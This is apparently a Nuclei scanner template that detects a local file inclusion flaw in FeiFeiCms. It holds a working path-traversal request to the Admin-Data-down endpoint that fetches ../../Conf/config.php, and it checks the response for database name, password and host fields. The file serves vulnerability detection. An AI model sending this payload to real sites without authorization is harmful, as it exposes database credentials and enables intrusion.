id: feifeicms-lfr

info:
  name: FeiFeiCms - Local File Inclusion
  author: princechaddha
  severity: high
  description: FeiFeiCms is vulnerable to local file inclusion.
  reference:
    - https://www.cnblogs.com/jinqi520/p/10202615.html
    - https://gitee.com/daicuo/feifeicms
  classification:
    cpe: cpe:2.3:a:feifeicms:feifeicms:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
    vendor: feifeicms
    product: feifeicms
  tags: feifeicms,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        name: feifeicms
        cpe: cpe:2.3:a:feifeicms:feifeicms:*:*:*:*:*:*:*:*
        words:
          - "<?php"
          - "db_name"
          - "db_pwd"
          - "db_host"
        condition: and
        part: body
